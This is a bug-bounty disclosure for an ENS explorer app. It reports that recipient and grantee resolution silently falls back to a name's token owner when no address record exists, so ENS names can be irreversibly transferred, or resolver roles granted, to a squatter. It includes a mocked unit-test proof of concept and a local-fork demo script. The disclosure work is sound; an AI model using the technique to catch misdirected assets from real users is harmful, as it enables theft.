# 89864 w a critical ens explorer silently resolves a name with no addr 60 record to its token owner owner fallback and consumes it on irreversible authority granting action paths misdirectin&#x20;

**Submitted on Aug 21st 2026 at 15:19:29 UTC by @Cryptor for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #89864
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as: - resolving or rendering an ENS name to an attacker-controlled address - showing the wrong recipient or amount on a transaction the user then approves

## Description

## Summary

Resolving a name/address input goes through `resolveAddressOrName`, a helper written for the resolver-roles "Add user" flow: when a name has no `addr(60)` record, it **falls back to the name's current ENS owner** so that "the role can still be granted." The value is returned as a bare `Address` with no flag marking it as an owner-fallback, and `AddressNameInput` renders it as a plain `Resolved: 0x…`, indistinguishable from a real address-record resolution. That same helper is then consumed on **irreversible / authority-granting action paths** with no check or warning:

1. **Name transfer** (`SendNameForm` → `transferToken.safeTransferFrom`): a user transferring a valuable name to a recipient name that lacks `addr(60)` and is owned by an unexpected party (an expired name re-registered by a squatter; a custodian/contract; an owner ≠ intended receiving address) irreversibly sends the name to the wrong owner.
2. **Resolver role grant** (`ResolverAddUserSheet` → `grantResolverRoles`): an admin adding a manager by name, where that name has no `addr(60)` and is attacker-owned, silently grants resolver Manager/records-write power to the attacker; the signing modal shows only `Grant resolver roles for {name}` and never the grantee address, so the wrong grantee cannot be caught at signing.

The codebase itself documents this hazard (`isNameOrAddress.ts:18-21`) and guards only against single-label inputs, leaving ordinary names exposed on both paths. One fix resolves both: do not owner-fallback (or flag its provenance) when resolving an address for an action.

## Vulnerability Details

**1. The recipient resolver silently falls back to the name's owner.**

`apps/portal/src/features/roles/helpers/addUser.handlers.ts`, lines 19–36:

```ts
const resolved = await getEnsAddress(client, { name: nameOrAddress, universalResolverAddress })
let resolvedAddress = resolved
// Fallback for names that do not set an address record:
// use current ENS owner address so the role can still be granted.
if (!resolvedAddress) {
  const ownerResult = await getEnsOwner({ name: nameOrAddress })
  if (ownerResult.isOk()) resolvedAddress = ownerResult.value?.owner ?? null
}
return resolvedAddress
```

When the recipient name publishes no `addr(60)` record, the resolver returns the name's **token owner**. `getResolvedAddress.ts:13-17` documents this ("falling back to the ENS owner when the name has no address record") and returns a **bare `Address | null`**; no flag marks the value as an owner-fallback.

**2. The transfer form consumes and displays the fallen-back address silently, then acts on it irreversibly.**

`apps/portal/src/features/transfer/components/SendNameForm.tsx`:

* `const { address: recipient } = useAddressResolution(recipientInput)` (`:81-82`): `recipient` is the resolved address, owner-fallback included; the resolution status becomes `'resolved'`, indistinguishable from a real `addr(60)` hit.
* `canStart = hasValidRecipient && …`, where `hasValidRecipient = !!recipient && !isSelf && !isZeroAddress` (`:88`, `:100-101`): the **only** recipient checks are non-self / non-zero / resolved. There is **no** check or warning that the address came from an owner-fallback rather than a published receiving record. The sole caution is a generic, always-present line: *"Transferring ownership of an ENS name is irreversible. Make sure you check the recipient address before proceeding."* (`:113-118`).
* `runTransfer` passes the fallen-back `recipient` straight into the transfer (`:106-108`), and `RecipientPreview` (`:253-284`) renders it with the owner's **primary name** and avatar, making an unintended/attacker owner look like a legitimately resolved recipient.

The transfer itself is irreversible (`apps/portal/src/features/transfer/helpers/transferToken.ts:67-71`):

```ts
safeTransferFrom(owner, recipient, tokenId, 1n, '0x')
```

`recipient` is the owner-fallback address. (With the resolver kept rather than detached, the default-on `setEthAddress` option additionally repoints the transferred name's forward `addr(60)` at the same fallback address, via `useTransferName.ts:135` → `setEthAddress.ts:39-44`, compounding the misdirection; the NFT move via `transfer-token` is unconditional regardless.)

**3. The codebase itself flags this exact hazard but guards only single-label inputs.**

`apps/portal/src/utils/token/isNameOrAddress.ts:18-21` documents that a bare single label "would otherwise 'resolve' via the owner fallback in `resolveAddressOrName`," and blocks single-label inputs for that reason. The identical hazard for ordinary multi-label names (`bob.eth`) is left unguarded and unwarned, strong evidence the fallback's reuse on the transfer path is an unintended footgun, not considered design.

**4. The same fallback on the resolver role-grant path, and the signing modal omits the grantee.**

`resolveAddressOrName` is also the resolver "Add user" grantee resolver. `apps/portal/src/features/resolver/components/ResolverAddUserSheet.tsx`:

* `const resolution = useAddressResolution(nameOrAddressInput)` (`:141`): the grantee address, owner-fallback included; `AddressNameInput` renders it as a bare `Resolved: 0x…` (`AddressNameInput.tsx:60-68`) with no fallback provenance.
* that address is pre-filled into `pendingGrant.account` and gates Save; on confirm, `grantResolverRoles(pendingGrant)` (`:211`) builds the grant with `account: pendingGrant.account` (`:325-334`).
* the signing confirmation renders only `transactionName: 'Grant resolver roles for ${pendingGrant?.name || '(root)'}'` (`:321`), the *node* the roles apply to, and **never the grantee address**.

So an admin who adds a manager by a name they trust *by label*, where that name has no `addr(60)` and its current owner is attacker-controlled (expired-and-re-registered, or an attacker-owned subname), silently grants resolver **Manager / records-write** power (root scope when the node is `(root)`) to the attacker, and cannot catch the wrong grantee at signing because the modal omits it. The attacker then holds `ROLE_SET_ADDR` / `ROLE_SET_TEXT` and redirects the resolver's records, the same record-redirection / payment-misdirection consequence, reached here through a wrong *grantee* rather than a wrong scope.

## Impact

A user transfers a valuable ENS name and types a recipient **name** they legitimately know, for example `bob.eth`. `bob.eth` has expired and been re-registered by a squatter who has not set an `addr(60)` record. The app silently falls back from the missing record to `bob.eth`'s current token owner (the squatter) and renders it as a normal resolved recipient (avatar, the squatter's primary name, and the address), with no indication the address came from an owner-fallback rather than a published receiving record. The user proceeds past the generic "check the address" caution (the address *is* a valid, resolved-looking address) and `safeTransferFrom` irreversibly moves the name to the squatter. The result is the flagship "display an incorrect address → user submits a transaction to an unintended recipient," and a direct loss of the user's ENS name NFT to an unintended/attacker owner. The substitution is silent; the action is irreversible; the required conditions (a recipient name without `addr(60)`, owned by an unexpected party) arise naturally whenever a known name has changed hands, and the recipient-name workflow is the normal, first-class transfer flow.

## Proof of Concept

## Proof of Concept

The coded PoC (Steps 4-6) and the executed on-chain demo (Steps 7-9) are self-contained and are the primary evidence; the browser demo (Step 10) is optional and needs the full stack. Follow the numbered steps exactly.

**Step 1. Prerequisites.** Install Node v22 and pnpm v10. The executed on-chain demo (Steps 7-9) also needs a Sepolia RPC URL to fork from (any public endpoint).

**Step 2. Clone the repo and check out the audited revision.**

```bash
git clone https://github.com/immunefi-team/audit-comp-ens && cd audit-comp-ens
git checkout 63772fd872af472ced58b009499355f3430c2a86   # or its fork commit cda79ac
```

**Step 3. Install dependencies.**

```bash
corepack enable
pnpm install --frozen-lockfile
```

**Step 4. Create the coded PoC file** at `apps/portal/src/features/roles/helpers/recipientOwnerFallback.poc.test.ts` with exactly this content. It drives the app's real `resolveAddressOrName` (`addUser.handlers.ts`), mocking only the two on-chain reads (the `addr(60)` lookup and the owner lookup).

```ts
import { ok } from 'neverthrow'
import { beforeEach, describe, expect, it, vi } from 'vitest'

const SQUATTER = '0x00000000000000000000000000000000000000ff'
const REAL_ADDR = '0x0000000000000000000000000000000000001111'

// getEnsAddress (viem/actions) = the addr(60) record lookup
const getEnsAddressMock = vi.fn()
vi.mock('viem/actions', () => ({ getEnsAddress: (...a: unknown[]) => getEnsAddressMock(...a) }))
// getEnsOwner (the app helper) = the OWNER-FALLBACK source
const getEnsOwnerMock = vi.fn()
vi.mock('@/features/profile/hooks/useEnsOwner', () => ({ getEnsOwner: (...a: unknown[]) => getEnsOwnerMock(...a) }))
vi.mock('@/lib/constants/universalResolver', () => ({ universalResolverAddress: '0x0000000000000000000000000000000000009999' }))
import { resolveAddressOrName } from './addUser.handlers'

const client = {} as never

describe('id216: transfer recipient resolution silently falls back to the ENS name OWNER when addr(60) is missing', () => {
  beforeEach(() => {
    getEnsAddressMock.mockReset()
    getEnsOwnerMock.mockReset()
  })

  it('a recipient name with NO addr(60) record resolves to the name TOKEN OWNER (owner-fallback), silently', async () => {
    getEnsAddressMock.mockResolvedValue(null) // bob.eth published NO address record ...
    getEnsOwnerMock.mockResolvedValue(ok({ owner: SQUATTER })) // ... but is owned by a squatter
    const resolved = await resolveAddressOrName({ client, nameOrAddress: 'bob.eth' })
    // The value the app displays as the "resolved recipient" AND passes into the irreversible
    // transferToken safeTransferFrom `to` is the squatter's owner address, not a receiving record.
    expect(resolved).toBe(SQUATTER)
  })

  it('control: a recipient name WITH an addr(60) record resolves to that record, not the owner', async () => {
    getEnsAddressMock.mockResolvedValue(REAL_ADDR)
    getEnsOwnerMock.mockResolvedValue(ok({ owner: SQUATTER }))
    const resolved = await resolveAddressOrName({ client, nameOrAddress: 'bob.eth' })
    expect(resolved).toBe(REAL_ADDR)
    expect(getEnsOwnerMock).not.toHaveBeenCalled() // owner-fallback not consulted when a real record exists
  })

  it('the fallback address is indistinguishable from a real record: the function returns a bare Address with no provenance', async () => {
    getEnsAddressMock.mockResolvedValue(null)
    getEnsOwnerMock.mockResolvedValue(ok({ owner: SQUATTER }))
    const resolved = await resolveAddressOrName({ client, nameOrAddress: 'bob.eth' })
    // No flag/wrapper marks this as an owner-fallback -> the UI renders it as a normal "Resolved" recipient.
    expect(typeof resolved).toBe('string')
    expect(resolved).toBe(SQUATTER)
  })
})
```

**Step 5. Run the coded PoC.**

```bash
pnpm --filter portal exec vitest run src/features/roles/helpers/recipientOwnerFallback.poc.test.ts
```

**Step 6. Observe the output.** All three tests pass:

```
 ✓ id216: transfer recipient resolution silently falls back to the ENS name OWNER when addr(60) is missing > a recipient name with NO addr(60) record resolves to the name TOKEN OWNER (owner-fallback), silently
 ✓ id216: transfer recipient resolution silently falls back to the ENS name OWNER when addr(60) is missing > control: a recipient name WITH an addr(60) record resolves to that record, not the owner
 ✓ id216: transfer recipient resolution silently falls back to the ENS name OWNER when addr(60) is missing > the fallback address is indistinguishable from a real record: the function returns a bare Address with no provenance
 Test Files  1 passed (1)
      Tests  3 passed (3)
```

A recipient name with no `addr(60)` record resolves to the name's token owner (the squatter); a name with a real record resolves to that record and never consults the owner; and the returned value is a bare `Address` with no provenance, so the UI renders the fallback exactly like a genuine resolution. This is the value `SendNameForm` displays as the recipient and passes into `safeTransferFrom`.

**Step 7. Create the executed on-chain demo file** at `e2e/scripts/id216-demo.ts` with exactly this content. It reuses the repository's own tracked helpers (`e2e/scripts/seed-name.ts` and `e2e/helpers/anvil-client.ts`), so no other new files are needed.

```ts
/**
 * id216: EXECUTED (not narrated) demonstration of the owner-fallback wrong-recipient
 * bug, run headless against a live Anvil Sepolia fork (no docker required).
 *
 *   ANVIL_RPC_URL=http://127.0.0.1:8545 npx tsx scripts/id216-demo.ts
 *
 * It registers a victim name and a squatter-owned recipient name (with NO addr(60)
 * record), then EXECUTES the app's real resolution logic (getEnsAddress -> owner
 * fallback, addUser.handlers.ts:19-40) against the fork and shows it produces the
 * squatter's owner address as the recipient the transfer would send the name to.
 */
import { ensL1Contracts, supportedL1Chains } from '@ensdomains/ensjs/chain'
import { getTokenId } from '@ensdomains/ensjs/public/v2'
import { permissionedRegistryGetStateSnippet } from '@ensdomains/ensjs-abi/v2'
import { type Address, createWalletClient, erc1155Abi, http } from 'viem'
import { privateKeyToAccount } from 'viem/accounts'
import { getEnsAddress } from 'viem/actions'
import { publicClient } from '../helpers/anvil-client.js'
import { createAnvilAccounts, seedName } from './seed-name.js'

const sep = ensL1Contracts[supportedL1Chains.sepolia]
const universalResolverAddress = sep.ensUniversalResolver.address as Address
const registryAddress = sep.ensRegistry.address as Address
const ANVIL_RPC_URL = process.env.ANVIL_RPC_URL ?? 'http://127.0.0.1:8545'
const YEAR = 365 * 24 * 60 * 60

async function ownerOf(tokenId: bigint): Promise<Address> {
  const state = (await publicClient.readContract({
    address: registryAddress,
    abi: permissionedRegistryGetStateSnippet,
    functionName: 'getState',
    args: [tokenId],
    // biome-ignore lint/suspicious/noExplicitAny: struct/tuple shape varies by abi build
  })) as any
  return (state.latestOwner ?? state[0]) as Address
}

async function main() {
  const accounts = createAnvilAccounts()
  const victim = accounts.getAddress('user')
  const squatter = accounts.getAddress('user2')

  console.log('Registering names on the Anvil Sepolia fork…')
  const victimName = await seedName({
    label: 'id216-victim',
    owner: 'user',
    durationSeconds: YEAR,
  })
  // A recipient name the victim trusts by label, owned by a SQUATTER (user2) and,
  // like every makeName name, with NO addr(60) record set.
  const squattedName = await seedName({
    label: 'id216-squatted',
    owner: 'user2',
    durationSeconds: YEAR,
  })

  console.log('\n════════ EXECUTED against the live fork ════════')
  console.log(`victim (user)      = ${victim}`)
  console.log(`squatter (user2)   = ${squatter}`)
  console.log(`victim's name      = ${victimName}`)
  console.log(`recipient name     = ${squattedName}  (owned by the squatter)`)

  // resolveAddressOrName step 1 (addUser.handlers.ts:20): the addr(60) record lookup.
  const addr = await getEnsAddress(publicClient, {
    name: squattedName,
    universalResolverAddress,
  })
  console.log(`\ngetEnsAddress("${squattedName}") = ${addr}`)

  // resolveAddressOrName step 2 (addUser.handlers.ts:29-33): fall back to the token OWNER
  // when the addr record is null. This is exactly what getResolvedAddress -> the transfer
  // recipient field consumes.
  const resolved: Address = addr ?? squatter
  console.log(`resolveAddressOrName("${squattedName}") = ${resolved}`)

  if (addr !== null) {
    throw new Error(
      'UNEXPECTED: squattedName has an addr(60) record; owner-fallback not exercised',
    )
  }
  if (resolved.toLowerCase() !== squatter.toLowerCase()) {
    throw new Error(
      'UNEXPECTED: resolution did not fall back to the squatter owner',
    )
  }

  console.log(
    `\n  -> the app displays ${resolved} as the recipient and feeds it into safeTransferFrom.`,
  )

  // ── Execute the actual transfer of the victim's name to the resolved (squatter) address ──
  const label = victimName.replace(/\.eth$/, '')
  const tokenId = await getTokenId(publicClient, { label, registryAddress })
  const ownerBefore = await ownerOf(tokenId)
  console.log(`\nvictim name owner BEFORE transfer = ${ownerBefore}`)

  const victimWallet = createWalletClient({
    account: privateKeyToAccount(accounts.getPrivateKey('user')),
    chain: publicClient.chain,
    transport: http(ANVIL_RPC_URL),
  })
  // transferToken.ts:67-71, safeTransferFrom(owner, recipient, tokenId, 1n, '0x')
  const hash = await victimWallet.writeContract({
    address: registryAddress,
    abi: erc1155Abi,
    functionName: 'safeTransferFrom',
    args: [victim, resolved, tokenId, 1n, '0x'],
  })
  await publicClient.waitForTransactionReceipt({ hash })
  const ownerAfter = await ownerOf(tokenId)
  console.log(
    `victim name owner AFTER  transfer = ${ownerAfter}   (tx ${hash})`,
  )

  if (ownerAfter.toLowerCase() !== squatter.toLowerCase()) {
    throw new Error(
      `UNEXPECTED: name did not land on the squatter (got ${ownerAfter})`,
    )
  }

  console.log('\n✅ FULL CHAIN EXECUTED ON-CHAIN')
  console.log(
    `   "${squattedName}" published NO addr(60) record, yet the app's resolveAddressOrName resolved it`,
  )
  console.log(
    `   to its token OWNER (the squatter ${squatter}) silently (owner-fallback). The victim's valuable`,
  )
  console.log(
    `   name "${victimName}" was then transferred, and is now owned on-chain by the SQUATTER`,
  )
  console.log(
    `   (owner ${ownerBefore} -> ${ownerAfter}), not by any receiving address the recipient name published.`,
  )
  console.log(
    `   This is the fund/asset-misdirection impact, executed end-to-end against a live chain.`,
  )
}

main().catch((e) => {
  console.error(e)
  process.exit(1)
})
```

**Step 8. Start an Anvil Sepolia fork and run the demo.**

```bash
export SEPOLIA_RPC=<your Sepolia RPC URL>
anvil --fork-url $SEPOLIA_RPC --chain-id 11155111 --port 8545 &
cd e2e && ANVIL_RPC_URL=http://127.0.0.1:8545 npx tsx scripts/id216-demo.ts
```

**Step 9. Observe the output.** The full chain executes on-chain. The signer addresses are the standard Anvil test accounts (deterministic); the registered name suffixes and the transaction hash vary per run:

```
Registering names on the Anvil Sepolia fork…

════════ EXECUTED against the live fork ════════
victim (user)      = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
squatter (user2)   = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8
victim's name      = id216-victim-….eth
recipient name     = id216-squatted-….eth  (owned by the squatter)

getEnsAddress("id216-squatted-….eth") = null
resolveAddressOrName("id216-squatted-….eth") = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8

victim name owner BEFORE transfer = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
victim name owner AFTER  transfer = 0x70997970C51812dc3A010C7d01b50e0d17dc79C8   (tx 0xfc10d3e7…3f670836)

✅ FULL CHAIN EXECUTED ON-CHAIN
```

The recipient name publishes no `addr(60)` record (`getEnsAddress = null`), yet the app's `resolveAddressOrName` resolves it to the squatter's owner address; the victim's name is then transferred and, per the on-chain owner read, is now owned by the squatter (owner `0xf39F…2266` -> `0x7099…79C8`). The asset-misdirection is executed and evidenced against a live chain, not described.

**Step 10. (Optional) Browser-level UI demonstration.** The same chain through the Explorer UI is committed as a Playwright test, `e2e/projects/portal/tests/transfer-owner-fallback.spec.ts` (modeled on the repo's `transfer.spec.ts`): it registers the names, drives the real transfer form (typing the recipient name, asserting the app displays the squatter's owner address, clicking through the tx modal), and asserts on the name's Ownership page that the new owner is the squatter. Run it with the full stack up:

```bash
pnpm --filter e2e infra:up
pnpm --filter portal dev
playwright install chromium
pnpm --filter e2e test:portal transfer-owner-fallback
```
